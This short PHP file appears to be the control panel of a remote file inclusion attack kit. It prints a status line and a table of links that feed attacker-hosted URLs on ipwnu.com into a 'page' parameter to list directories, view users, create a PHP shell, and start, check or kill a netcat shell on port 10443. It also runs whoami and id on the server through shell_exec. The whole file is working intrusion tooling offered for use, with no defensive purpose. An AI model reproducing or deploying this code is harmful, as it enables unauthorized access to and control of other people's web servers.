<?php

if(!$message){ $message = "OK"; }

echo "Status: ".$message."<br>";
?>

<table>

<tr><td>Description</td><td>Link</td></tr>
<tr><td>List Directories</td><td><a href='?page=http://ipwnu.com/ls'>View</a></td></tr>
<tr><td>View Users</td><td><a href='?page=http://ipwnu.com/users'>View</a></td></tr>
<tr><td>Create PHP Shell</td><td><a href='?page=http://ipwnu.com/getphpshell'>Go</a></td></tr>
<tr><td>Start NetCat Shell on Port 10443</td><td><a href='?page=http://ipwnu.com/ncat'>Start</a> | <a href='?page=http://ipwnu.com/checkncat'>Status</a> | <a href='?page=http://ipwnu.com/killncat'>Stop All</a> </td></tr>
<tr><td>PHPInfo</td><td><a href='?page=http://ipwnu.com/phpinfo'>View</a></td></tr>
<tr><td></td><td></td></tr>
<tr><td>Current User: </td><td><?php echo shell_exec('whoami');?></td></tr>
<tr><td>Current UID</td><td><?php echo shell_exec('id');?></td></tr>

</table>

